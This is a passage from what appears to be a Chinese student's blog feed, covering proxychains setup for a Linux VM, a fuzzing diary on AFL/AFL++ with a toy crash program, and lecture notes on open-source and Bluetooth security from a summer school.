，将【允许局域网链接】选中，鼠标浮于其上时，记住 【WLAN】这一项</p><p><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p4.png"></p><p>  再设置一下 ubuntu 内的 proxy 如下</p><p><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p5.png"></p><p>打开 windows 宿主机内的代理，此时 Linux 内也可以访问 google 啦！！</p><h1 id="让-Linux-的终端也享受代理吧"><a href="#让-Linux-的终端也享受代理吧" class="headerlink" title="让 Linux 的终端也享受代理吧"></a>让 Linux 的终端也享受代理吧</h1><p>  刚刚的设置只能让 Linux 访问 google 页面，而此时终端仍然不会走代理的！访问 github 还是很吃力。</p><p>  接下来需要使用 proxychain 这个工具</p><ul><li>安装proxychains工具</li></ul> <figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install proxychains<br></code></pre></td></tr></table></figure><ul><li><p>然后我们需要对<code>/etc/proxychains.conf</code>进行修改，将自己的代理ip地址和端口添加到ProxyList下。例如<code>socks5 192.xxx.xxx.xxx 10808</code> 并将原本有的那一条<code>sock4 xxx.xxx......</code>给<strong>注释掉</strong>！！</p><p>此时就配置好了！</p><p>可用 curl 命令测试一下</p></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> curl www.google.com<br></code></pre></td></tr></table></figure><img src="/2023/08/30/%E7%BB%99%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8A%E5%85%B6%E7%BB%88%E7%AB%AF%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86%E5%90%A7%EF%BC%81/p7.png"><p>   可以看到倒数第二行，我的下载速度可达到接近 10MB/s 了</p><p>   <strong>至此，我们可以欢快地使用 proxy 在 Linux 内啦！</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>非常感谢这几篇文章的作者！</p><p><a href="https://www.zhihu.com/question/495148700">https://www.zhihu.com/question/495148700</a></p><p><a href="https://blog.csdn.net/weixin_45467056/article/details/105956782">https://blog.csdn.net/weixin_45467056/article/details/105956782</a></p><p><a href="https://docs.shanyuhai.top/os/manjaro/terminal-agent.html#proxychains-ng">https://docs.shanyuhai.top/os/manjaro/terminal-agent.html#proxychains-ng</a></p><p>再次感谢！</p>]]></content>
    
    
    
    <tags>
      
      <tag>tricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My Fuzzing Development Diary</title>
    <link href="/2023/08/16/My-Fuzzing-Development-Diary/"/>
    <url>/2023/08/16/My-Fuzzing-Development-Diary/</url>
    
    <content type="html"><![CDATA[<p>该文章将持续记录本人在 vul337 实习过程中，参与的 fuzz 项目的开发经历。</p><h1 id="0x01-了解-fuzz"><a href="#0x01-了解-fuzz" class="headerlink" title="0x01 了解 fuzz"></a>0x01 了解 fuzz</h1><p>  来 vul 337 实习之前，我对 fuzz 处于一无所知的状态，当初抱着“我可能本科毕业后需要找工作，学一下这个看起来很厉害的技术，到时候有口饭吃”的想法，给 chao 老师发送了邮件，申请成为337的一个实习生。</p><hr><h2 id="从综述论文开始"><a href="#从综述论文开始" class="headerlink" title="从综述论文开始"></a>从综述论文开始</h2><p>  刚刚入组实习，X学长为我打开了 fuzz 的大门，我先阅读了 <a href="https://link.springer.com/content/pdf/10.1186/s42400-018-0002-y.pdf">Fuzzing A Survey</a> 这篇综述论文；这篇论文概述了 fuzzing 技术的原理、发展，以及不同类型 fuzzing 的区别。</p><h2 id="Fuzzing-是什么"><a href="#Fuzzing-是什么" class="headerlink" title="Fuzzing 是什么"></a>Fuzzing 是什么</h2><p>如下图：</p><p><img src="/2023/08/16/My-Fuzzing-Development-Diary/p1.png"></p><p><strong>自动化地向目标程序（被测试程序）输入测试案例，并从执行结果中获取一些感兴趣的信息</strong>，这就是 Fuzzing。</p><h3 id="关于-Fuzzing-的流程"><a href="#关于-Fuzzing-的流程" class="headerlink" title="关于 Fuzzing 的流程"></a>关于 Fuzzing 的流程</h3><p>  我们向被测试的程序输入 cases，待程序执行完成后，统计执行结果，以上步骤进行若干轮循环后，集中分析被统计的<strong>感兴趣</strong>的结果。而后根据日志信息，尝试复现触发的 crash ，并进行分析。</p><h3 id="被测试程序、初始输入-target、input"><a href="#被测试程序、初始输入-target、input" class="headerlink" title="被测试程序、初始输入 target、input"></a>被测试程序、初始输入 target、input</h3><p>  被测试程序就是一个具有向外 api 接口的程序或函数；</p><p>  初始输入是未经过变异的、我们根据被测试程序构造出来的一串字符串 or binary input。</p><h3 id="变异-mutate"><a href="#变异-mutate" class="headerlink" title="变异 mutate"></a>变异 mutate</h3><p>  变异（mutate）是指每轮 Fuzzing 中，对 input 进行一定的改变的操作，例如：</p><ul><li><p>input 为 123 ，经过一定的变异策略，变异后的输入会变为 124 or etc；</p><p>常见的变异策略有：</p></li><li><p>bitflip：位翻转，将 input 中某一位的0改为1，或1改为0；</p></li><li><p>splice：拼接，将多个输入按某些顺序地拼接为一个较长的输入；</p></li><li><p>havoc：大破坏，即胡乱地变化；</p></li><li><p>Radamsa：一种集成了多种基本变异策略的mutator；（后面我会详细叙述，因为这个是我负责插件化写入 xfuzz 项目的一个 mutator）</p></li></ul><h3 id="感兴趣的结果，crash"><a href="#感兴趣的结果，crash" class="headerlink" title="感兴趣的结果，crash"></a>感兴趣的结果，crash</h3><p>  感兴趣的结果包括：发现了新的执行路径、触发了一些 error 、程序崩溃掉了等等；</p><h3 id="复现、crash分析"><a href="#复现、crash分析" class="headerlink" title="复现、crash分析"></a>复现、crash分析</h3><p>  这个部分目前我还不是很会做，不好意思。</p><p>  至此，我了解到了 Fuzzing 这个技术是如何对程序进行测试的，以及该流程中一些名词的具体含义。</p><hr><p>  接下来，我学习了<a href="https://www.usenix.org/conference/atc12/technical-sessions/presentation/serebryany">AddressSanitizer: A Fast Address Sanity Checker</a>这篇文章，及其主要技术——ASAN。</p><h2 id="关于-ASAN"><a href="#关于-ASAN" class="headerlink" title="关于 ASAN"></a>关于 ASAN</h2><h3 id="什么是-ASAN"><a href="#什么是-ASAN" class="headerlink" title="什么是 ASAN"></a>什么是 ASAN</h3><p>  简单来说，ASAN 就是一个通过插桩实现的，检测内存非法访问的工具。</p><h3 id="ASAN-带给我了什么启发"><a href="#ASAN-带给我了什么启发" class="headerlink" title="ASAN 带给我了什么启发"></a>ASAN 带给我了什么启发</h3><p>ASAN 正式将插桩（instrumentation）这个概念介绍给了我。</p><p>更多关于 ASAN 的详细内容<a href="https://kawatsuki.com/2023/03/02/AddressSanitizer/">我之前的博客</a>有写。</p><hr><p>至此，我花了三天的时间将 Fuzzing 大概是个啥，搞清楚了一点；</p><p>随后，就开始探索这个最经典的 Fuzzer —— AFL</p><h1 id="0x02-从-AFL-探索起"><a href="#0x02-从-AFL-探索起" class="headerlink" title="0x02 从 AFL 探索起"></a>0x02 从 AFL 探索起</h1><p>  AFL 可谓是初学 fuzz 一定会接触的一个 fuzzer，我的第一个 fuzz 软件也是 AFL</p><h2 id="什么是AFL"><a href="#什么是AFL" class="headerlink" title="什么是AFL"></a>什么是AFL</h2><ul><li><p>全称 American Fuzzy Lop</p></li><li><p>google 公司的工程师 Michal Zalewski 开发</p></li><li><p>可以高效地对目标进行模糊测试</p></li><li><p>使用 coverage-based 基于覆盖率的 fuzz</p></li><li><p>可以对 closed source program 进行测试</p></li></ul><h2 id="下载、安装AFL"><a href="#下载、安装AFL" class="headerlink" title="下载、安装AFL"></a>下载、安装AFL</h2><p>  请参考官方文章：<a href="https://lcamtuf.coredump.cx/afl/QuickStartGuide.txt">https://lcamtuf.coredump.cx/afl/QuickStartGuide.txt</a></p><h2 id="关于插桩"><a href="#关于插桩" class="headerlink" title="关于插桩"></a>关于插桩</h2><p>  插桩（instrumentation）是指<strong>向目标程序内植入一些代码，以达到监测状态，发现执行路径的作用</strong></p><p>  目前有<strong>编译时插桩</strong>，容易看出，这种插桩方法需要有源码；</p><p>  也有 qemu 等插桩，以及其他 tricks，无源码的插桩方法仍需多研究。（注：正在研究，2023/08/31)</p><h2 id="通过案例去感受"><a href="#通过案例去感受" class="headerlink" title="通过案例去感受"></a>通过案例去感受</h2><p>  可以简单写一个 C 文件，核心函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span>)<br>      <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;o&#x27;</span>)<br>        <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;o&#x27;</span>)<br>          <span class="hljs-keyword">if</span>(buf[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;!&#x27;</span>)<br>            <span class="hljs-built_in">abort</span>(); <span class="hljs-comment">//crash!</span><br>&#125;<br></code></pre></td></tr></table></figure><p>  简单来说，就是 input 为 <code>foo!</code>时，会触发 <code>abort()</code>函数，会报出 crash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./afl-fuzz -i testcase_dir -o findings_dir --<br></code></pre></td></tr></table></figure><p>  afl 安装好后，使用上面的命令运行，<code>-i</code>参数后为输入的目录，该目录下有你的输入文件；<code>-o</code>后则是存放 crash 信息的目录。</p><p>  <strong>注</strong>：真正使用 afl 时没有这么顺利，请善用 google 进行搜索，将错误信息复制到 google 内，一般都会有答案的  ( 0.o )</p><h1 id="0x03-xfuzz"><a href="#0x03-xfuzz" class="headerlink" title="0x03 xfuzz"></a>0x03 xfuzz</h1><p>  xfuzz，一种基于插件化的多策略集合 fuzzer。如今新的 fuzzing 策略层出不穷，四大顶刊上有关 fuzzing 的论文也是数不胜数，这些论文都提出了一些新的更高效的 fuzzing 策略，而我们想真正的将其利用起来却不太方便，单独看某个策略，会发现局限性比较大。而 xfuzz 项目的目的就是将这些策略以<strong>插件化的方式集成到项目中来</strong>，供使用者<strong>自由调度、自行搭配</strong>。</p><p>  xfuzz 是我在 vul337 实验室的参与的一个项目，我主要负责一些插件的编写。</p><h2 id="xfuzz的历史"><a href="#xfuzz的历史" class="headerlink" title="xfuzz的历史"></a>xfuzz的历史</h2><p>  根据 gitlab 上的记录，xfuzz 项目早在 2021年（可能更早）就由一位组内的学长进行编写、维护。而最近重启之，应该是在23年的3月左右。</p><p>  其间的一两年，xfuzz应该是停止开发的状态。</p><h2 id="Persistent-Mode"><a href="#Persistent-Mode" class="headerlink" title="Persistent Mode"></a>Persistent Mode</h2><p>  Persistent Mode 是我负责的第一个插件，简单来说，<strong>Persistent Mode 通过在某些情况下不使用程序的<code>fork()</code>而以修改源码，利用程序内的循环达到反复测试的目的</strong>。</p><p>  关于 Persistent Mode 我之前写过两篇博客，但回头看来，又有许多可以改进之处，故留个小坑，过些时于本文中详述下 Persistent Mode。</p><p>  （TODO：详细总结 Persistent Mode 于此）</p><h2 id="Radamsa-Mutator"><a href="#Radamsa-Mutator" class="headerlink" title="Radamsa Mutator"></a>Radamsa Mutator</h2><h2 id="Frida-Mode"><a href="#Frida-Mode" class="headerlink" title="Frida Mode"></a>Frida Mode</h2><h1 id="0x05-Closed-Source-Fuzz"><a href="#0x05-Closed-Source-Fuzz" class="headerlink" title="0x05 Closed Source Fuzz"></a>0x05 Closed Source Fuzz</h1><p>  由于目前的任务是开发 executor 方向的 frida mode 插件，故着手了解一下无源码 fuzzing</p><p>  参考文章：<a href="https://airbus-seclab.github.io/AFLplusplus-blogpost/">https://airbus-seclab.github.io/AFLplusplus-blogpost/</a></p><h2 id="无源码插桩"><a href="#无源码插桩" class="headerlink" title="无源码插桩"></a>无源码插桩</h2><h2 id="实践一下"><a href="#实践一下" class="headerlink" title="实践一下"></a>实践一下</h2><p>  今日（2023/08/31），基于昨天配置好的 AFL++，开启了以下的尝试。</p><p>  为什么不是 AFL？因为 AFL 的 qemu mode 需要 python2 而非 python3，且一些依赖的库过时严重，安装之的时候，把我虚拟机 Ubuntu Desktop 搞崩溃了，听说是显卡驱动的原因，反正修了一天没修好，所以决定用 AFL++ ！</p><p>  这是测试程序源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;one\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;two\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;three\n&quot;</span>);<br>          <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;four\n&quot;</span>);<br>            <span class="hljs-built_in">abort</span>();<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125; <span class="hljs-comment">// end of while (__AFL_LOOP(1000))</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>  简而言之，就是输入的字符串为<code>foo!</code>时，会触发<code>abort()</code>，检测到 crash。</p><p>  使用以下命令进行 fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i input -o output -Q vuls/foo<br></code></pre></td></tr></table></figure><ul><li>-i, -o 参数后为输入/输出文件夹；（我的 input 设置为 foo）</li><li>-Q 参数开启 Qemu mode，无源码 fuzz；</li><li>vuls/foo 是用 gcc 编译的上面的目标 C 文件；</li></ul><p>测试结果：</p><p>  不到一分钟，报出 crash：</p><p>  <img src="/2023/08/16/My-Fuzzing-Development-Diary/p2.png"></p><p>  进入<code>output/default/crashes</code>文件夹</p><p>  使用<code>xxd</code>命令查看可得：</p><p><img src="/2023/08/16/My-Fuzzing-Development-Diary/p3.png"></p><p>  触发 crash 的输入正是 <code>foo!</code></p><h2 id="对比编译时插桩"><a href="#对比编译时插桩" class="headerlink" title="对比编译时插桩"></a>对比编译时插桩</h2><p>  使用以下指令进行编译/插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-clang-fast vuls/foo.c -o vul1<br></code></pre></td></tr></table></figure><p>  然后用以下指令进行 fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i input -o output vuls/vul1<br></code></pre></td></tr></table></figure><p> 注：此处已不再需要<code>-Q</code>参数，因为是已经插桩好了的程序</p><p>  运行时：</p><p><img src="/2023/08/16/My-Fuzzing-Development-Diary/p4.png"></p><p>  也是很快的速度就报出了 crash</p><p>  经过对比，不难发现：</p><ul><li><p>有源码会比无源码快 2-5 倍；</p></li><li><p>都很准确；</p><p>无源码的体验暂时到这，接下来的计划：</p></li><li><p>读 qemu mode 代码，了解下其运行时插桩的逻辑；</p></li><li><p>了解 frida；</p></li><li><p>more…</p></li></ul><h2 id="qemu-mode"><a href="#qemu-mode" class="headerlink" title="qemu-mode"></a>qemu-mode</h2><p>  AFL++ 采用一种补丁后的 Qemu 模拟器的 User mode 进行覆盖率采集</p><p><img src="/2023/08/16/My-Fuzzing-Development-Diary/p5.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Let&#39;s GoSSIP Summer School</title>
    <link href="/2023/08/16/Let-s-GoSSIP-Summer-School/"/>
    <url>/2023/08/16/Let-s-GoSSIP-Summer-School/</url>
    
    <content type="html"><![CDATA[<h1 id="Let’s-GoSSIP"><a href="#Let’s-GoSSIP" class="headerlink" title="Let’s GoSSIP"></a>Let’s GoSSIP</h1><p>  这篇博客我拖了一个月后的今天，晚上（2023/09/02 23点35分）才开始着手更新，刚刚点了个超市的外卖，内容是两桶 5L 装的纯净水和一份冰块，准备用一颗胶囊做一杯冰美式，今天晚上便可多更新一些。</p><p>  话归正题，一小时前，讲师们 PPT 放出的邮件让我从床上跳了起来，之前一直没有更新该文章的原因，就是一直没拿到 PPT ，我认为这次的暑期学校对我本人的启发极大，故准备认真地记录下来，便拖延至今，东风既来，听我一叙。</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  正式开始课程内容之前，我们先来参观一下上海科技大学张江高等研究院</p><p>  会议室（上课的教室）：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p1.jpg"></p><p>  外景：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p2.jpg"></p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p3.jpg"></p><p>  内景：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p4.jpg"></p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p5.jpg"></p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p6.jpg"></p><p>以及部分餐食：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p7.jpg"></p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p8.jpg"></p><p>  主观感觉上，上交张江研究院真的是一所一流的研究院，无论是设施、安保、环境等等方面来看。工作人员的素质也超高，在里面访学，能给人一种安心、温暖的感觉。</p><p>  刚刚看了一眼当时的课程安排，又有无数的内容浮上心头，夜深了，外面淅淅沥沥下着小雨。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p1.png"></p><h1 id="Day1-上午-开源软件安全"><a href="#Day1-上午-开源软件安全" class="headerlink" title="Day1 上午 开源软件安全"></a>Day1 上午 开源软件安全</h1><p>  第一天上午，第一位讲师是来自<strong>明尼苏达大学（University of Minnesota, UMN)<strong>的</strong>卢康杰</strong>老师，卢老师为同学们分析了开源系统的现状</p><h2 id="开源系统安全性缺陷"><a href="#开源系统安全性缺陷" class="headerlink" title="开源系统安全性缺陷"></a>开源系统安全性缺陷</h2><p>  <img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p2.png"></p><p>  由上图可见，开源系统有着<strong>代码量庞大、依赖繁杂</strong>的特点，并且<strong>使用人数众多</strong>，其中的漏洞影响力很强，与此同时，<strong>共同开发者是不可信任的</strong>，且<strong>维护由志愿者负责</strong>。</p><p>  此时，考虑一下<strong>部分开发者提交的补丁中，藏有漏洞后门</strong>的可能性，这便是卢老师提出的安全问题的一部分。</p><h2 id="许多漏洞迟迟未修复"><a href="#许多漏洞迟迟未修复" class="headerlink" title="许多漏洞迟迟未修复"></a>许多漏洞迟迟未修复</h2><p>  <img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p3.png"></p><p>  根据统计，<strong>八成以上</strong>的漏洞，仍然是漏洞，没有人去修复它。</p><p>  卢老师提及，他们团队曾发现 gcc 编译过程中产生的一个漏洞，告知 gcc 官方多次，却被告知“这是 gcc 规则之外的漏洞，不该他们修，他们也不会去修”，大致意思如上，故该漏洞至今仍然存在。（大概是一个编译过程中字节对齐相关的漏洞，很可惜我现在记不太清楚了！）</p><h2 id="关于开源系统安全的总结"><a href="#关于开源系统安全的总结" class="headerlink" title="关于开源系统安全的总结"></a>关于开源系统安全的总结</h2><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p4.png"></p><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><p>  卢老师课上经常提及 LLVM 这个编译器，他认为我们都应该了解、熟悉 LLVM，会自己写出 IR 来。LLVM 是学习系统安全之路上不可或缺的一部分。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p5.png"></p><p>  上图是 LLVM 编译的流程，将C/C++源代码通过若干个中间的 Pass 进行编译，最后生成可执行的机器码。</p><p>  我有计划好好地去了解、学习一下 LLVM，但目前仍对其几乎一无所知，故关于 LLVM 的更多内容，请关注我的后续博客，本学期（大三上）应该有编译原理课程，希望能充分了解编译。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  第一天上午，卢老师给同学们带来的“开场戏”十分精彩，卢老师从开源系统存在的安全隐患入手，讲到如何做好系统安全研究，再到关于 LLVM 的知识，以及对未来建设一个更体制完全、更安全开放的互联网环境的展望。通过卢老师风趣幽默、流畅自如的语言，我深刻地感受到卢老师的人格魅力，对自己研究的自信，对系统安全行业的深刻认识。</p><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>  第一天上午，我了解到，与会的72位同学中，半数以上的同学是博士（或已经毕业了的博士），另外一半的同学中，也有不少于半数的硕士，顿时感觉会场卧虎藏龙、深不可测，对本次的暑期学校多了一份敬畏！</p><h1 id="Day1-下午-物联网蓝牙安全"><a href="#Day1-下午-物联网蓝牙安全" class="headerlink" title="Day1 下午 物联网蓝牙安全"></a>Day1 下午 物联网蓝牙安全</h1><p>  第一日下午的课程，由来自<strong>杜雷塞尔大学（Drexel University）</strong>的<strong>张悦</strong>老师主讲。可能是本人第一次接触蓝牙安全的原因，该报告是我对技术细节最为印象深刻的报告之一。</p><h2 id="关于蓝牙（Bluetooth）"><a href="#关于蓝牙（Bluetooth）" class="headerlink" title="关于蓝牙（Bluetooth）"></a>关于蓝牙（Bluetooth）</h2><p>  显而易见，蓝牙由许多优点：</p><ul><li><p>无线链接（Wireless Connection);</p></li><li><p>简易使用（Easy Setup and Use)；</p></li><li><p>不断进化（Constant Evolution);</p></li><li><p>广泛支持（Widely Supported);</p></li><li><p>安全私密（Secure and Private);</p><p>蓝牙发展史：</p></li></ul><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p6.png"></p><h3 id="Bluetooth-Low-Energy"><a href="#Bluetooth-Low-Energy" class="headerlink" title="Bluetooth Low Energy"></a>Bluetooth Low Energy</h3><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p7.png"></p><p>  可见，BLE 的能耗低、作用范围广。</p><p>  若有一个手机，使用蓝牙连接了一个手环，则手环称为 Peripheral/Slave，而手机成为 Central/Master，但由于 slave &amp; master 有一些政治因素，故一般都使用前面的官方名称为主。</p><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>  通过非对称加密算法，得到一个公钥和一个私钥，两者均可用来加密/解密，无本质区别，但习惯称加密所用的是公钥，而解密所需的为私钥。</p><h2 id="几种配对方式"><a href="#几种配对方式" class="headerlink" title="几种配对方式"></a>几种配对方式</h2><h3 id="Just-Works"><a href="#Just-Works" class="headerlink" title="Just Works"></a>Just Works</h3><p>  互发密钥，收到的密钥与自己拥有的密钥进行算法验证，若通过，则匹配成功。</p><p>坏处：Attacker 可以伪装成 Slave/Master，分别获取两者的密钥。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p8.png"></p><h3 id="Out-of-Band"><a href="#Out-of-Band" class="headerlink" title="Out of Band"></a>Out of Band</h3><p>  寻找一个可信的信道，进行密钥的传输</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p9.png"></p><p>  问题：是否真的有完全可信的信道。</p><h3 id="Passkey-Entry"><a href="#Passkey-Entry" class="headerlink" title="Passkey Entry"></a>Passkey Entry</h3><p>  Slave 将密钥显示在屏幕上，由配对人亲自输入到 Master 中，达到配对。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p10.png"></p><p>  可以回想，我们常常使用某些配对需求的软件时（不一定是 Bluetooth），有时 Slave 会显示一串复杂的字符，让我们输入到手机/电脑内。</p><p>  这个方式是比较安全的，但需要 Master 有 Keyboard 输入功能。</p><h3 id="Numeric-Comparison"><a href="#Numeric-Comparison" class="headerlink" title="Numeric Comparison"></a>Numeric Comparison</h3><p>  数字匹配，两者交换密钥后，通过算法算出一个值，只需要人眼去看，两者的 Screen 上数字是否一致即可</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p7.png"></p><p>该方法和 Passkey Enrty 一样，可以有效地避免黑客的攻击。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p12.png"></p><p>如上图，黑客发出的 key，在两台设备上计算出的结果一定不一致（或极小概率一致），可认为黑客无法使用该手段进行攻击。</p><h2 id="研究论文"><a href="#研究论文" class="headerlink" title="研究论文"></a>研究论文</h2><p>  张老师随后介绍了他发表在四大顶刊上的部分论文：</p><ul><li><p>Yue Zhang, Jian Weng, Rajib Dey, Yier Jin, Zhiqiang Lin, and Xinwen Fu. “Breaking Secure Pairing of Bluetooth Low Energy Using Downgrade Attacks”, To appear in Usenix Security 2020</p></li><li><p>Mohit K. Jangid*, Yue Zhang*, Zhiqiang Lin. “Extrapolating Formal Analysis to Uncover Attacks in Bluetooth Passkey Entry Pairing. NDSS 2023</p></li><li><p>Shao, Zhijian, Jian Weng, Yue Zhang, Yongdong Wu, Ming Li, Jiasi Weng, Weiqi Luo, and Shui Yu. “Peripheral-free Device Pairing by Randomly Switching Power.” IEEE Transactions on Dependable and Secure Computing</p><p>感兴趣的朋友可以自行阅读。</p></li></ul><h2 id="重放攻击（Replay）"><a href="#重放攻击（Replay）" class="headerlink" title="重放攻击（Replay）"></a>重放攻击（Replay）</h2><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p13.png"></p><p>   解决办法：</p><ul><li>加入随机数，在验证的过程中：</li></ul><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p14.png"></p><h2 id="蓝牙地址和追踪"><a href="#蓝牙地址和追踪" class="headerlink" title="蓝牙地址和追踪"></a>蓝牙地址和追踪</h2><p>  蓝牙是有一个独一无二的地址的，同一时间内，当你开着蓝牙，在城市中游荡时，就会容易被黑客定位。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p15.png"></p><p>  黑客可以四处使用他的设备，进行蓝牙广播，若收到你的设备的 response，则可确定，你就在他方圆50m内（甚至更近）。</p><p>如何防范被追踪：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p16.png"></p><p>  开启蓝牙地址的随机化，不使用某一个固定的地址，而是不断的更新。</p><p>  随后张老师介绍了基于 Allowlist 和 mac 地址随机化间隔的一些 tricks。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>  张老师是一位在蓝牙安全领域硕果满满的研究人员，他的报告十分硬核，有不下五篇文章的相关技术细节，令我大受启发，醍醐灌顶！</p><h1 id="Day2-上午-CDN-安全研究"><a href="#Day2-上午-CDN-安全研究" class="headerlink" title="Day2 上午 CDN 安全研究"></a>Day2 上午 CDN 安全研究</h1><p>  